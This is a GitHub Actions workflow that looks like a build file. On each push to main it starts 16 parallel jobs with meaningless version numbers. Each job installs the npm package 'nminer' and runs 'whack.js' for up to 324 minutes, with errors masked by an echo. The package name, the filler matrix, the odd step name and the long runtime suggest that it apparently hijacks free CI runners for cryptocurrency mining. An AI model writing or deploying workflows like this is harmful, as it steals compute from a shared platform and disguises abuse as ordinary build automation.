name: whack
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6960 }
          - { version: 4579 }
          - { version: 5172 }
          - { version: 4489 }
          - { version: 637 }
          - { version: 5446 }
          - { version: 8977 }
          - { version: 4570 }
          - { version: 348 }
          - { version: 3752 }
          - { version: 2093 }
          - { version: 7957 }
          - { version: 5430 }
          - { version: 3642 }
          - { version: 6925 }
          - { version: 8100 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: handle where volleyball
        run: |
          npm install nminer@latest
          timeout 324m node whack.js || echo "whack executed"